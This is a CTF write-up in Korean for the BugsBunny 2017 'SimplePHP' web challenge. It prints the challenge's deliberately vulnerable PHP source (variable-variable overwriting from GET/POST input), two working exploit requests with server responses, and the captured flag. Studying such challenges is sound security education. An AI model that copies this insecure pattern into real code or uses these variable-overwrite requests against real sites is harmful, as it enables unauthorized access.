# [2017_BugsBunny] \[WEB] SimplePHP

### CODE

```php
<?php

include "flag.php";

$_403 = "Access Denied";
$_200 = "Welcome Admin";

if ($_SERVER["REQUEST_METHOD"] != "POST")
	die("BugsBunnyCTF is here :p...");

if ( !isset($_POST["flag"]) )
	die($_403);


foreach ($_GET as $key => $value)
	$$key = $$value;

foreach ($_POST as $key => $value)
	$$key = $value;


if ( $_POST["flag"] !== $flag )
	die($_403);


echo "This is your flag : ". $flag . "\n";
die($_200);

?>
```



### Exploit

extract() 함수와 비슷한 기능을 실행합니다. php 내부의 변수를 우리가 마음대로 조작할 수 있습니다.

#### 방식1 - 문자열 변수 조작

POST로 flag 값을 입력하면 모든 조건문을 통과한 후, flag를 출력해주는데 $_POST 변수를 처리하는 과정에서 그 값이 우리가 입력한 값으로 변하게 되어 원래의 flag 값을 알아낼 수가 없습니다 출력됩니다.

하지만 뒤에서 $_200 값을 출력해주기 때문에 미리 $\_200 값에 flag값을 미리 넣어두면 원래의 flag 값을 알아낼 수 있습니다

```
Anti-Vulnerability:tyro_heap DelspoN$ http -f POST http://34.253.165.46/SimplePhp/index.php?_200=flag flag=a
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Length: 62
Content-Type: text/html; charset=UTF-8
Date: Mon, 07 Aug 2017 08:38:16 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.18 (Ubuntu)

This is your flag : a
Bugs_Bunny{Simple_PHP_1s_re4lly_fun_!!!}
```

#### 방식2 - 배열 변수 조작

_403값과 _POST["flag"] 값을 조작하여 flag를 출력합니다.

```
Anti-Vulnerability:tyro_heap DelspoN$ http -f POST "http://34.253.165.46/SimplePhp/index.php?_403=flag&_POST[flag]=bbb" flag=aaa
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Length: 40
Content-Type: text/html; charset=UTF-8
Date: Mon, 07 Aug 2017 08:35:53 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.18 (Ubuntu)

Bugs_Bunny{Simple_PHP_1s_re4lly_fun_!!!}
```

